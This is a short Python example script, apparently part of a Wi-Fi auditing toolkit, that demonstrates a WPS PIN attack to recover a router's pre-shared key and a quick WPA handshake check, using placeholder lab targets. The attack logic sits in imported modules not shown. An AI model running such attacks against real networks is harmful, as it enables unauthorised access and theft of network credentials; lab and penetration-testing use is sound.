#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Example: Fast WPS PIN attack on lab router
"""

from models.attack import Attack
from models.handshake import Handshake
from wps_attack import WPSAttack
from config_lab import LabConfig

def quick_wps_attack(bssid, essid, wps_pin, interface='wlan0mon'):
    """Quick WPS PIN attack"""
    
    print(f"[*] Starting quick WPS attack on {essid} ({bssid})")
    print(f"[*] Using PIN: {wps_pin}")
    
    # Create target object
    class SimpleTarget:
        def __init__(self, bssid, essid, channel='6'):
            self.bssid = bssid
            self.essid = essid
            self.channel = channel
    
    target = SimpleTarget(bssid, essid)
    
    # Attack with PIN
    wps = WPSAttack(target, pin=wps_pin, interface=interface)
    success, psk = wps.attack_with_pin()
    
    if success:
        print(f"[+] SUCCESS! PSK: {psk}")
        return psk
    else:
        print("[!] Attack failed")
        return None

def fast_handshake_capture(capfile, bssid, essid):
    """Fast handshake verification"""
    
    print(f"[*] Verifying handshake: {capfile}")
    
    hs = Handshake(capfile, bssid=bssid, essid=essid)
    
    # Fast verification (15 second timeout)
    has_hs = hs.has_handshake_fast(timeout=15)
    
    if has_hs:
        print(f"[+] Valid handshake found!")
        print(f"    Method: {hs.verification_method}")
        print(f"    Time: {hs.verification_time:.2f}s")
        return True
    else:
        print("[!] No valid handshake")
        return False

if __name__ == '__main__':
    # Example 1: WPS PIN Attack
    print("=" * 60)
    print("Example 1: WPS PIN Attack")
    print("=" * 60)
    quick_wps_attack('AA:BB:CC:DD:EE:FF', 'TEST-LAB', '12345670')
    
    # Example 2: Fast Handshake Verification
    print("\n" + "=" * 60)
    print("Example 2: Fast Handshake Verification")
    print("=" * 60)
    fast_handshake_capture('hs/test.cap', 'AA:BB:CC:DD:EE:FF', 'TEST-LAB')
